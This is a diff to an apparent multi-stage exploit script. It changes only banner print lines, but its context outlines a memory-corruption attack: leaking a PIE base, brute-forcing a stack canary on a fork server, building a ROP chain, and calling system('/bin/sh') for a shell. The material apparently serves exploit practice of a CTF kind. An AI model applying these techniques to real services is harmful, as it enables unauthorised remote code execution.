@@ -9,7 +9,7 @@ print("[*] Target:", host, ":", port)
 
 # Stage 1: Information Disclosure
 print("\n[STAGE 1] Information Disclosure")
-print("=" * 50)
+print("==================================================")
 
 let conn = connect(host, port)
 
@@ -44,7 +44,7 @@ print("[+] PIE base:", hex(pie_base))
 
 # Stage 2: Bypass Canary
 print("\n[STAGE 2] Canary Bypass")
-print("=" * 50)
+print("==================================================")
 
 # Fork server preserves canary - brute force byte by byte
 define function leak_canary()
@@ -79,7 +79,7 @@ print("[+] Full canary:", hex(canary))
 
 # Stage 3: ROP Chain with Leaked Addresses
 print("\n[STAGE 3] ROP Chain Construction")
-print("=" * 50)
+print("==================================================")
 
 # Gadgets relative to PIE base
 let pop_rdi = pie_base + 0x1337
@@ -105,7 +105,7 @@ let leak_chain = [
 
 # Stage 4: Build Full Exploit
 print("\n[STAGE 4] Full Exploit Assembly")
-print("=" * 50)
+print("==================================================")
 
 let offset = 40
 let payload = "A" * offset
@@ -135,7 +135,7 @@ print("[+] /bin/sh:", hex(bin_sh))
 
 # Stage 5: Final Shell
 print("\n[STAGE 5] Shell Exploitation")
-print("=" * 50)
+print("==================================================")
 
 # Build final payload with system("/bin/sh")
 let final_payload = "A" * offset
